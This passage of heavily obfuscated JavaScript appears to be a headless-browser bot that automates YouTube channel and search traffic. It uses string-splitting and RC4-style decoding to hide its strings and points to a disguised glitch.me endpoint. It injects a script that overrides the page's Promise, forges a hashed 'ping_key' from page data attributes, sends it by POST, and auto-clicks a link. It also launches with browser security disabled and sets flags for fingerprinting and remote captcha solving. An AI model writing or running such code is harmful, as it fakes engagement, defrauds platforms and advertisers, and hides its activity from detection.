                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x6dd * -0x1 + -0x293 * 0x2 + 0xc08 | L >>> 0x56b + -0x5ce * 0x4 + 0x2fc * 0x6) + (M & N | ~M & O) + P + (0x6c3c6920 + 0x149471aa + 0x1 * -0x264e6131) + Q[J] << 0xa66 * 0x1 + -0x50e * -0x6 + 0xd * -0x322) << 0x2020 + -0x152 + -0x25 * 0xd5 | P >>> -0x128 * -0x8 + 0x2 * 0x3c4 + 0x1 * -0x10ad) + (L & (M = M << 0x14a + 0x1625 * 0x1 + 0x2f * -0x7f | M >>> 0x1683 + 0x1 * 0x26b9 + -0x1cd * 0x22) | ~L & N) + O + (-0x1 * -0x5db4d08d + 0x36cc5ec + -0x69f1ce0) + Q[J + (-0x392 + 0xb2e + 0x3b * -0x21)] << 0x12da * 0x1 + -0x4f * 0x51 + 0x625) << 0x22 * -0xf1 + 0xbe6 + 0x1421 * 0x1 | O >>> 0x29 * 0xdb + -0x11 * 0x1a5 + 0x703 * -0x1) + (P & (L = L << -0x17a + -0x67b + -0x1 * -0x813 | L >>> 0xf * 0x21 + -0x2 * 0x119a + 0x2147 * 0x1) | ~P & M) + N + (-0x56fb * 0x1059d + -0x5c7d5046 + 0x10fe308ce) + Q[J + (0x17 * 0x169 + -0x283 * -0x1 + -0x22f0)] << 0x1 * 0xf09 + -0x834 * 0x2 + -0x3 * -0x75) << -0x1fd + 0xbe * 0x2e + -0x2022 | N >>> 0xe5 * -0x15 + 0x106f + 0x275) + (O & (P = P << -0x1851 + 0x4 * -0x3ff + 0xd79 * 0x3 | P >>> -0x3b * -0x77 + 0x6 * 0x59d + -0x1 * 0x3d19) | ~O & L) + M + (-0x4c908b5 + -0x8333bcc3 + 0xe27f3f11) + Q[J + (0x1 * -0x1eb5 + -0x1 * -0x2387 + 0x1 * -0x4cf)] << 0x1 * -0x6c7 + -0x11e + -0x7e5 * -0x1) << 0x7e6 + 0xa0 * 0x22 + -0x1d21 | M >>> 0x1 * -0xdb2 + -0x1c3c + 0x2a09) + (N & (O = O << 0x52d + 0xf58 + -0x1467 | O >>> 0x1 * 0xca6 + 0x195d + -0x2601) | ~N & P) + L + (-0x417c468f + 0x2 * 0x131c65bd + 0x3535b * 0x236a) + Q[J + (0x315 + 0x21bc + 0x1 * -0x24cd)] << -0x995 + -0x139 * -0x4 + 0x1 * 0x4b1, N = N << -0x59 * 0x15 + 0x1 * -0x1e49 + 0x13 * 0x1fc | N >>> -0x2475 + 0xe4e + 0x1629;
              for (; J < 0x215f + -0x1d * -0x6 + -0x1 * 0x21e5; J += -0x449 * -0x3 + -0x2098 + 0x13c2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0x17df + -0x1bb7 + 0x339b | L >>> 0x1375 + 0x136e + -0x88 * 0x49) + (M ^ N ^ O) + P + (-0x6 * -0x3797e29 + -0xbd1ee5f0 + 0x1171fdc9b) + Q[J] << 0x1 * -0x10f7 + -0x1bd * 0xb + 0x2416) << 0x2007 + -0x1fd0 + -0x32 | P >>> 0x19dc + -0x6f + 0xca9 * -0x2) + (L ^ (M = M << -0x573 + 0x3af + 0x1e2 | M >>> -0x1810 + -0x2519 + 0x3d2b) ^ N) + O + (-0x54e8a6fe + 0xc56c7a15 + 0x45c2 * -0x61b) + Q[J + (-0x1f09 + 0x17ed + 0x71d)] << -0x31f * 0x7 + -0x19 * -0x159 + -0xbd8) << 0x25 * 0x4f + -0xe60 + 0x2fa | O >>> -0x20dd + 0x21a1 + -0xa9) + (P ^ (L = L << 0x1461 + 0x1 * -0x1d07 + 0x8c4 | L >>> -0x1 * -0xe26 + -0x217d * 0x1 + -0x1359 * -0x1) ^ M) + N + (0x7167a132 + -0x73127628 + -0xc1 * -0x953f57) + Q[J + (-0x4af + -0x41 * 0x17 + 0xa88)] << -0x9a * -0x3 + 0x2587 + -0x2755) << -0x353 * -0x7 + -0x14d7 + -0x269 | N >>> -0x4 * -0x4c8 + 0x116 * 0x3 + 0x1 * -0x1647) + (O ^ (P = P << 0x80d + 0x816 + -0x3 * 0x557 | P >>> 0x1 * 0x18d4 + -0x11 * -0xef + -0x28b1) ^ L) + M + (-0xd80d2522 + -0xa7554e49 + -0x2 * -0xf71e2f86) + Q[J + (-0x596 * 0x3 + 0x1491 + -0x4 * 0xf3)] << -0x1 * -0xb11 + -0x2662 + -0xbd * -0x25) << -0x26 * 0xfb + 0xfcd + 0x157a | M >>> 0xbb6 + 0x105d + -0x1bf8) + (N ^ (O = O << -0x4 * -0x375 + 0x15ed + -0xbe1 * 0x3 | O >>> 0x1638 + -0x269e + 0x1068) ^ P) + L + (0x2ac0d * -0x29aa + -0x2033 * 0x25807 + 0x7 * 0x2a858618) + Q[J + (-0xb86 + -0x1d17 * 0x1 + 0x1 * 0x28a1)] << 0x7 * 0x469 + 0x1 * -0x16f + 0x2 * -0xeb8, N = N << -0x24ff + 0x17f * 0x17 + 0xad * 0x4 | N >>> 0xef0 + 0x1b46 + -0x49 * 0x94;
              for (; J < 0x1f * -0xe8 + 0x5c8 + -0x6f * -0x34; J += 0x9 + -0xeaf + -0x1 * -0xeab)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x12fc + 0x21ed + 0x2fc * -0x5 | L >>> -0x25 * -0x3 + -0xeee + 0xe9a) + (M & N | M & O | N & O) + P - (-0x14e24a44 * -0x1 + 0x2a * 0x40c3fa0 + -0x4e007760) + Q[J] << 0x1901 + 0x14cb * 0x1 + -0x2dcc) << -0x17 * -0xaf + 0x1 * 0xa9e + -0x1a52 | P >>> -0x26dd * -0x1 + -0x1 * -0x86e + -0x5e6 * 0x8) + (L & (M = M << 0xb4f + -0x22a2 + 0x1771 | M >>> 0x18 + 0x1 * 0xd2b + -0x75 * 0x1d) | L & N | M & N) + O - (0x81915386 * 0x1 + 0x2b3daf72 + -0x1 * 0x3beabfd4) + Q[J + (0x2 * 0xdcc + -0x3d5 + 0x2 * -0xbe1)] << 0x1 * -0x23fb + -0x10de + 0x53 * 0xa3) << -0x2d7 * 0x1 + 0x10c * 0x2 + 0xe * 0xe | O >>> 0x1 * 0x58c + 0x26df + -0x2c50 * 0x1) + (P & (L = L << 0x79 * -0x37 + -0x3b * 0x83 + 0x1c27 * 0x2 | L >>> -0x1 * -0x2435 + -0x33 * 0x1b + -0x107 * 0x1e) | P & M | L & M) + N - (0x1e07e678 + -0xad0d8499 + 0xffe9e145) + Q[J + (-0x3b * -0x4f + -0xbd * 0x18 + -0x3 * 0x29)] << 0x170f * 0x1 + -0x181d * 0x1 + -0x10e * -0x1) << -0x1e8 * -0x8 + -0x3d5 * 0x2 + -0x95 * 0xd | N >>> -0x206d + 0x74d * 0x3 + 0xaa1) + (O & (P = P << 0x7c3 * -0x3 + -0x1ff3 * 0x1 + 0x375a | P >>> -0x1 * -0x15f3 + 0xaaf + -0x20a0) | O & L | P & L) + M - (-0x28 * 0x3c3969a + 0x1 * -0xa73ff053 + 0x1aeb3bb87) + Q[J + (-0x845 + 0x2 * -0xee7 + 0x186 * 0x19)] << 0x1a8 * -0x10 + -0x361 * 0x4 + 0x2804) << -0xa5f + 0x1d53 + -0x1 * 0x12ef | M >>> -0x1 * 0x15f8 + -0x1875 + 0x2e88) + (N & (O = O << 0x3 * 0x75a + -0x1 * 0xc77 + -0x979 | O >>> -0x701 + -0x4a7 * 0x3 + 0x14f8) | N & P | O & P) + L - (0xf3e2df6 + 0x401027be + 0x2195ed7 * 0x10) + Q[J + (0x1a40 * -0x1 + 0x2d * -0x43 + 0x260b * 0x1)] << -0x595 + 0x6b + -0x1 * -0x52a, N = N << 0xe22 + -0x15b9 + 0x7b5 | N >>> -0x2150 + 0x1 * 0x2528 + -0x3d6;
              for (; J < 0xe1f + -0x728 + -0x6a7; J += 0x1 * 0x10d3 + 0x18c3 + 0x3 * -0xddb)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0x25e1 + -0xee9 + -0x16f3 | L >>> -0x86b + -0x1056 + -0x4a * -0x56) + (M ^ N ^ O) + P - (-0x3bf077c3 + -0x4 * -0x194651e6 + 0xc746e55) + Q[J] << 0x1 * -0x410 + 0x2 * 0x467 + -0x1 * 0x4be) << 0xb66 + 0x21b + -0xd7c | P >>> 0xd7b + -0x170b + 0x9ab) + (L ^ (M = M << 0x1 * 0x1a42 + 0xd * 0xdb + -0x2543 | M >>> 0x20b1 * -0x1 + -0x1f45 * 0x1 + 0x2c8 * 0x17) ^ N) + O - (0x4d66754d + 0x11c32f * -0x12d + 0x1735c70 * -0x2) + Q[J + (0x4 * 0xf3 + -0x7f6 * 0x2 + -0x40b * -0x3)] << 0xf92 + 0x110 * -0x2 + 0x6b9 * -0x2) << -0xf7f * 0x1 + -0x23b1 + 0x3335 | O >>> 0x1b * -0x48 + 0x1 * -0x23d3 + -0x3 * -0xe82) + (P ^ (L = L << 0x6bb + -0x96 * 0x3c + 0x1c8b | L >>> -0x416 * 0x2 + -0x22af + 0x2add) ^ M) + N - (-0x3801380d * -0x1 + -0x20a * -0xfccd + -0x46773e5) + Q[J + (-0x726 * -0x3 + 0x3 * -0x169 + 0x1 * -0x1135)] << -0x2309 * -0x1 + 0xab6 + -0x2dbf) << 0x15 * -0x14b + 0x1 * 0x179c + -0x390 * -0x1 | N >>> 0x3d * -0x26 + 0x2502 + -0x1bd9 * 0x1) + (O ^ (P = P << 0x1fc3 + -0x8d5 + -0x16d0 | P >>> -0x11d5 + 0x8b6 + 0x30b * 0x3) ^ L) + M - (-0x67bfa17a + -0x2 * -0x350a3d09 + 0x33486592) + Q[J + (-0x24a8 + 0x1 * -0x16c3 + 0x3b6e)] << 0x9d3 * -0x1 + -0x4 * -0x800 + -0x162d) << 0x1bcf + 0x416 * 0x2 + -0x23f6 | M >>> 0xa * 0x184 + -0x3 * 0x466 + 0x5f * -0x5) + (N ^ (O = O << -0x12f0 + 0x1a6e + 0x4 * -0x1d8 | O >>> 0x452 + -0x235e + 0x1f0e) ^ P) + L - (0xd05cdd2 * 0x1 + 0x5bce50e + 0x22da8b4a) + Q[J + (-0x16e6 * -0x1 + -0x5e * -0xe + -0x1 * 0x1c06)] << -0x2 * -0x11f3 + 0xaa8 + 0x2 * -0x1747, N = N << -0x6 * 0x2a7 + -0x1 * -0x12fb + -0x2f3 | N >>> 0x199b + 0xbfb + -0x2594;
              this['h0'] = this['h0'] + L << 0x13 * 0x5e + -0x8c5 + 0x9 * 0x33, this['h1'] = this['h1'] + M << 0x21ba + 0xc5 * 0x32 + 0x1 * -0x4834, this['h2'] = this['h2'] + N << 0x1 * -0x1977 + 0x1c60 + -0x2e9, this['h3'] = this['h3'] + O << 0x1c39 + 0x6 * -0x8 + 0x1 * -0x1c09, this['h4'] = this['h4'] + P << -0x2071 + -0x2010 + 0x4081;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x26c0 + -0x10c9 * -0x2 + 0x2 * 0x2a5 & -0x743 * -0x1 + -0x10b3 + 0x97f] + w[J >> -0x264d + 0x1b47 + 0xb1e & 0x5 * 0x1d6 + 0x4 * -0x2cb + 0x20d] + w[J >> -0x15d3 + 0x1da0 + -0x1 * 0x7b9 & 0xaa7 * 0x3 + -0xbbd * 0x2 + -0x134 * 0x7] + w[J >> -0x4 * 0x2e3 + -0x2435 + 0x2fd1 * 0x1 & -0xd70 + -0x1 * -0x247c + -0x16fd] + w[J >> -0x2306 + -0x5 * -0x533 + 0x65 * 0x17 & 0x20de + -0x1 * -0x23cf + -0x449e] + w[J >> 0x11f7 * -0x2 + 0x1e85 + 0x571 & -0x227b + -0xa89 + 0xb * 0x419] + w[J >> -0x2 * 0x32b + 0xd00 + 0x2 * -0x353 & -0xf09 + 0x6 * -0x44b + 0x6 * 0x6cf] + w[0x1da8 + -0x1f91 + 0x1f8 & J] + w[K >> -0x3 * 0xaf3 + -0x3cc + 0x24c1 & 0x3d1 * -0x1 + -0x1 * 0x1c2b + -0x200b * -0x1] + w[K >> 0xa1 * 0x27 + 0x355 * 0x1 + -0x1bc4 & -0x8e4 + -0x2453 + 0x2d46] + w[K >> 0xe9 * -0x11 + -0xa0d + -0x3a * -0x71 & -0xb6e + -0x106 * 0x13 + 0x1eef] + w[K >> -0x1 * -0x1a67 + -0x3f5 * 0x7 + 0x15c & 0x4 * -0x891 + 0x6b * 0x3b + 0x4d5 * 0x2] + w[K >> -0x1 * -0x1ceb + 0x37f + 0x1 * -0x205e & -0x19ac + 0x1 * -0x746 + -0x47 * -0x77] + w[K >> 0xb * -0x2b1 + 0x26b * 0xe + -0x437 * 0x1 & -0xf85 + -0x18ff + 0x2f * 0xdd] + w[K >> 0x1049 + 0x1 * 0x11a7 + -0x21ec & 0x1 * 0x163 + -0x2 * -0xc29 + 0xe * -0x1d5] + w[0x229c + -0x81c + -0x1a71 & K] + w[L >> -0x52b + 0x89 * -0xb + 0xb2a * 0x1 & -0x1769 + -0x21b9 + 0x3931] + w[L >> -0xf * 0x185 + 0x2256 + 0xb73 * -0x1 & 0x3 * -0x982 + -0xf7 + 0x1d8c] + w[L >> -0x3dd * 0x7 + 0x1200 + 0x91f & 0x7f4 * -0x3 + -0x17 * 0x77 + 0xa * 0x376] + w[L >> -0x1 * 0x1415 + -0x1f39 * 0x1 + 0x335e & -0x1aa4 + -0x256 + 0x1d09] + w[L >> 0x9d8 + 0x1ca4 + -0x19a * 0x18 & 0xb9d + -0x1653 + 0xac5] + w[L >> -0x1 * 0x12ef + 0x2378 + -0x1 * 0x1081 & 0x1b03 + -0x3 * 0x687 + -0x75f] + w[L >> 0xc4d + 0x1 * 0xa85 + 0x6 * -0x3cd & -0x7e7 + -0x1f2b + 0x2721] + w[-0x465 + 0xaa6 + -0x7a * 0xd & L] + w[M >> -0xaa1 + 0x2117 + -0x165a & 0x2b7 + 0xd38 + 0x3f8 * -0x4] + w[M >> -0x14d6 + -0xc0 + -0x2 * -0xad7 & 0xc1a + -0x1f5b + 0x1350] + w[M >> -0xca9 + -0x64c * 0x5 + 0x1 * 0x2c39 & 0x141e + -0x2259 + 0xe4a] + w[M >> -0x1990 + -0x214 * -0x9 + 0x6ec * 0x1 & -0x1d0e * -0x1 + 0x1115 + -0x2e14] + w[M >> -0xd9 + -0x741 + 0x826 & -0x85 * -0x7 + 0x8c9 + 0x3 * -0x41f] + w[M >> -0x1f85 + 0x14ae * -0x1 + 0x343b & 0x40a + 0x1 * -0x1e9d + 0x1aa2 * 0x1] + w[M >> 0x24ef + -0x23c2 + -0x129 & 0x6ea + -0x2474 + -0x1 * -0x1d99] + w[0x25f3 + -0x9d * 0x11 + -0x1b77 & M] + w[N >> -0x30 * -0x99 + 0x1fc1 + 0x5 * -0xc11 & -0x1 * -0x24d7 + -0x2 * -0x2fc + 0x72 * -0x60] + w[N >> 0xf02 + 0x1fb5 + -0x2e9f & 0x1b5f + 0x27 * 0x8e + 0xa * -0x4e5] + w[N >> -0x17 * 0xe3 + -0x6 * -0x4de + -0x3 * 0x2e9 & -0x16f7 + 0x531 + -0x11d5 * -0x1] + w[N >> 0x1 * 0x22af + 0x1 * -0x1bcd + 0x6d2 * -0x1 & -0xc75 + 0x2442 + -0x17be] + w[N >> -0x113f * 0x1 + 0x845 * -0x1 + 0x1990 & 0x1f45 + 0x539 * 0x1 + -0x246f * 0x1] + w[N >> -0x1034 * 0x2 + -0xf * 0xec + 0x2e44 & 0x2307 + 0x1 * -0x2423 + -0xd * -0x17] + w[N >> 0x1 * 0xa1f + 0x49 * 0x82 + 0x3a1 * -0xd & -0xa4e * 0x3 + -0xc5 * 0x28 + 0x3dc1 * 0x1] + w[-0x1ddc + 0xc15 + -0x11d6 * -0x1 & N];
            }
            [W(0x11, '(!vu')]() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x7fa + -0x2c6 + 0xad8 & 0x27e + -0x2388 + -0x1 * -0x2209,
                J >> -0x10c9 + -0x26f3 + 0x37cc & -0x26b4 + 0x1 * -0x80d + 0x8 * 0x5f8,
                J >> 0x1b27 + 0x167b + -0x319a & -0x1 * 0x164f + 0x24ac + -0xd5e,
                -0xc0c + -0x2088 + -0x2d93 * -0x1 & J,
                K >> 0x2b * 0x89 + -0xf9 * 0x22 + 0x1 * 0xa27 & 0x4 * 0x63 + -0x3b6 + -0x1 * -0x329,
                K >> 0x1a83 * -0x1 + -0x1 * -0x23ce + -0x93b & -0x397 * -0x8 + 0x1222 * 0x2 + -0x3ffd,
                K >> 0x21e9 + -0x1ec0 + -0x59 * 0x9 & -0x391 + 0x233b * 0x1 + -0x1eab,
                -0x1103 + -0x1b77 + 0x67f * 0x7 & K,
                L >> -0x183 * -0x9 + -0x13 * 0x1f1 + 0x4 * 0x5d8 & -0x12fb + 0x1 * 0x54d + 0xead,
                L >> 0x1e00 + -0x5cb * -0x4 + -0x351c & 0x2259 + 0x23 * 0x15 + -0x2439,
                L >> 0x435 + 0x1602 + -0x1 * 0x1a2f & 0x1d2 + -0x3bb + -0x1f * -0x18,
                0xb * 0x29c + -0x2 * 0x33c + -0x153d * 0x1 & L,
                M >> -0x1846 + 0x47 * 0x6b + -0x54f & -0x1b72 + -0x38a * 0xb + 0x435f * 0x1,
                M >> 0x213f * -0x1 + -0x1 * -0x1fb5 + 0x5 * 0x52 & -0x8f4 + -0x1b56 * -0x1 + -0x1163 * 0x1,
                M >> -0x263d + 0x23f6 + -0x3 * -0xc5 & -0xfc8 + 0x1 * 0x187e + 0x19 * -0x4f,
                0x1995 + -0x5e1 + 0x12b5 * -0x1 & M,
                N >> 0x4e6 + 0xcaa + 0x22f * -0x8 & -0x93 * -0x1e + 0x74 * -0x43 + 0xe21,
                N >> -0x29 * -0xb9 + -0x1a96 + -0x2fb & -0x1007 + -0x3ba * -0xa + -0x143e,
                N >> -0xb3f * -0x1 + 0x3 * -0x9e0 + 0x1 * 0x1269 & 0x20e * -0x1 + -0x1 * 0x18eb + 0x1bf8,
                -0x614 + -0xf3f + 0x1652 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x11 * 0x1e7 + 0x16b7 + 0x9b4), (K = new DataView(J))['setUint32'](-0x2 * -0x1117 + -0x1434 + 0x2 * -0x6fd, this['h0']), K['setUint32'](0x565 * 0x4 + 0x14 * -0x8 + -0xa78 * 0x2, this['h1']), K['setUint32'](0x1 * 0x247 + -0x1 * 0x11f2 + 0xfb3, this['h2']), K['setUint32'](0x1d5a + -0x1 * -0x215 + -0x1f63, this['h3']), K['setUint32'](-0x6 * 0x5ad + 0x1195 + -0x1089 * -0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me'](X(0x1c) + 'nk')[-0x1011 + -0x9 * 0x407 + 0x8 * 0x68a];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x2635 + 0xa1f + -0x3054;
            J[0x8a5 * -0x1 + 0x172b + -0xe86]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x2 * 0x6d3 + -0x3d * 0x43 + 0x1d9d] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x237d + -0x4a * 0x4f + -0xca6), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x6d0 + 0x142c + -0xd5b;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0xcc * 0x15 + -0xb * 0x37d + -0x1 * -0x1b7f), Promise['resolve'](-0x1625 + -0xce9 + -0x5 * -0x703);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x33 * 0x39 + -0x2 * 0xaca + 0xa39; j < 0x25 * 0x35 + -0x5 * 0x791 + -0x3 * -0xa0f; j++)
    i();
}
const NETWORK_PATIENCE = -0x89c + -0x1b05 * 0x1 + 0x42e1 + (0x243f + -0x77c + -0x1 * 0x110b) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x2b * -0x6c + -0x5d * -0x40 + 0xf * -0x57) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1912 + -0x989 * -0x1 + 0xf89);
    let h = e[f];
    if (b['kwIonB'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x137 * -0x1e + 0x5 * 0x570 + -0xcba * 0x5, s, t, u = 0x1138 + 0x5cf + -0x1707; t = n['charAt'](u++); ~t && (s = r % (-0x3 * -0x4b1 + -0x2 * -0x2a9 + 0xb * -0x1c3) ? s * (0x2 * -0xe83 + 0xd99 + 0xfad) + t : t, r++ % (0x3 * -0xcdf + -0x72b * 0x2 + 0x34f7)) ? p += String['fromCharCode'](-0x9cf + -0x4 * 0x3 + 0xada & s >> (-(-0x1ca * -0xe + -0x2 * 0x2a9 + -0x4ee * 0x4) * r & -0x114e + 0x1e4f + -0xcfb)) : 0x765 + 0x1a9c + -0x2201) {
          t = o['indexOf'](t);
        }
        for (let v = -0x60d + 0x1694 + -0x1087, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x4 * 0x7b9 + -0xd7 * 0x5 + 0x191 * -0x11))['slice'](-(-0x396 * -0x9 + -0xb3a + -0x150a * 0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x26cd + 0x761 * -0x5 + -0x1e8,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1cd6 + -0x348 + -0x198e; u < -0x2281 + -0xd3d + 0x30be; u++) {
          p[u] = u;
        }
        for (u = 0x163 + 0x6 * -0x5fd + 0x228b; u < -0x25a8 + 0x11 * 0x1f + -0xc33 * -0x3; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1e5c + -0x1e * -0x9e + 0x19b * 0x8), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x16e9 + 0x16e * -0xa + 0x2535, q = 0x384 * 0xa + 0xe2d + -0xad * 0x49;
        for (let v = -0x95 * -0x38 + -0x1 * -0x19b7 + -0x3a4f; v < n['length']; v++) {
          u = (u + (-0x15a * 0x10 + -0x1821 + 0x2dc2)) % (0xa9 * -0x3b + -0x140e * 0x1 + 0x3c01), q = (q + p[u]) % (-0x435 * 0x1 + -0x24bd + -0x3b * -0xb6), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x25d * -0x9 + 0x23d7 + -0x13 * 0x2f4)]);
        }
        return t;
      };
      b['QINZqn'] = m, c = arguments, b['kwIonB'] = !![];
    }
    const j = e[0x2182 + -0x11f9 + 0x29 * -0x61],
      k = f + j,
      l = c[k];
    return !l ? (b['OaxXFc'] === undefined && (b['OaxXFc'] = !![]), h = b['QINZqn'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = Y(0x1a);
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0xfe8 + -0xcb * -0x25 + -0x2d3f; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1912 + -0x989 * -0x1 + 0xf89);
    let h = e[f];
    return h;
  }, d(b, c);
}
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 